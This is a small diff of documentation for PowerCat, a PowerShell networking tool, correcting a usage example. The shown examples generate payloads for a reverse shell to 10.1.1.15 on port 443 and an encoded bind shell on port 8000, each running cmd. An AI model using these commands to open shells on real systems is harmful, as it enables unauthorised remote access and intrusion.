@@ -117,7 +117,7 @@ Payloads can be generated using New-PowerCatPayload.
     New-PowerCatPayload -Client 10.1.1.15 -Port 443 -Execute cmd 
         
     # Generate a bind tcp encoded command which listens on port 8000:
-    New-PowerCatPayload -Encoded -Listener -Port 8000 -Execute cmd -Payload 
+    New-PowerCatPayload -Encoded -Listener -Port 8000 -Execute cmd
 ```
 Misc Usage
 ----------
